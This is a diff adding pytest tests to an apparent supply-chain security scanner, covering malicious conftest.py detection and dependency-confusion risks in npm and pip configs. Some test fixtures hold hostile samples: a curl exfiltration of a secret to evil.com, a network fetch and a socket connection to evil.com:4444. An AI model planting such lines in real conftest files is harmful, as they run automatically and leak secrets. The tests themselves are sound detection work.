@@ -376,6 +376,94 @@ class TestPromptInjection:
 
 
 # ──────────────────────────────────────────────
+# 6b. P2 Features: conftest.py + Dep Confusion
+# ──────────────────────────────────────────────
+
+class TestConftestPy:
+    """P2-2: pytest conftest.py auto-execution attack detection."""
+
+    def test_clean_conftest(self, tmp_dir, checker):
+        content = '''import pytest
+
+@pytest.fixture
+def client():
+    return {"host": "localhost"}
+'''
+        (tmp_dir / "conftest.py").write_text(content)
+        issues = checker.check_conftest_py(tmp_dir / "conftest.py")
+        assert issues == []
+
+    def test_network_request_in_conftest(self, tmp_dir, checker):
+        content = '''import requests
+response = requests.get("https://evil.com/config")
+'''
+        (tmp_dir / "conftest.py").write_text(content)
+        issues = checker.check_conftest_py(tmp_dir / "conftest.py")
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+        assert any(i['rule_id'] == 'SUPPLY-031' for i in issues)
+
+    def test_subprocess_in_conftest(self, tmp_dir, checker):
+        content = '''import subprocess
+subprocess.run(["curl", "https://evil.com/exfil", "--data", "secret"])
+'''
+        (tmp_dir / "conftest.py").write_text(content)
+        issues = checker.check_conftest_py(tmp_dir / "conftest.py")
+        assert any(i['rule_id'] == 'SUPPLY-031' for i in issues)
+
+    def test_socket_in_conftest(self, tmp_dir, checker):
+        content = '''import socket
+s = socket.create_connection(("evil.com", 4444))
+'''
+        (tmp_dir / "conftest.py").write_text(content)
+        issues = checker.check_conftest_py(tmp_dir / "conftest.py")
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+
+    def test_comment_not_flagged(self, tmp_dir, checker):
+        content = '''# subprocess.run(["curl", "https://example.com"])  # disabled
+import pytest
+'''
+        (tmp_dir / "conftest.py").write_text(content)
+        issues = checker.check_conftest_py(tmp_dir / "conftest.py")
+        assert issues == []
+
+
+class TestDependencyConfusion:
+    """P2-3: Dependency confusion attack surface detection."""
+
+    def test_npm_scope_with_private_registry(self, tmp_dir, checker):
+        (tmp_dir / ".npmrc").write_text(
+            "@myco:registry=https://private.registry.myco.com/\n"
+        )
+        (tmp_dir / "package.json").write_text(json.dumps({
+            "dependencies": {
+                "@myco/internal-auth": "1.0.0",
+                "lodash": "4.17.21"
+            }
+        }))
+        issues = checker.check_dependency_confusion(tmp_dir)
+        # @myco/internal-auth should be flagged as confusion risk
+        assert any(i['rule_id'] == 'SUPPLY-032' for i in issues)
+        assert any('@myco/internal-auth' in str(i) for i in issues)
+        # lodash (public package) should NOT be flagged
+        assert not any('lodash' in str(i) for i in issues)
+
+    def test_no_private_registry_no_confusion(self, tmp_dir, checker):
+        (tmp_dir / "package.json").write_text(json.dumps({
+            "dependencies": {"lodash": "4.17.21"}
+        }))
+        issues = checker.check_dependency_confusion(tmp_dir)
+        assert issues == []
+
+    def test_python_extra_index_url_risk(self, tmp_dir, checker):
+        (tmp_dir / "pip.conf").write_text(
+            "[global]\nextra-index-url=https://private.pypi.myco.com/simple/\n"
+        )
+        (tmp_dir / "requirements.txt").write_text("myco-internal-sdk==1.0.0\n")
+        issues = checker.check_dependency_confusion(tmp_dir)
+        assert any(i['rule_id'] == 'SUPPLY-032' for i in issues)
+
+
+# ──────────────────────────────────────────────
 # 7. Hardcoded Secret / API Key Detection (P0-1)
 # ──────────────────────────────────────────────
 
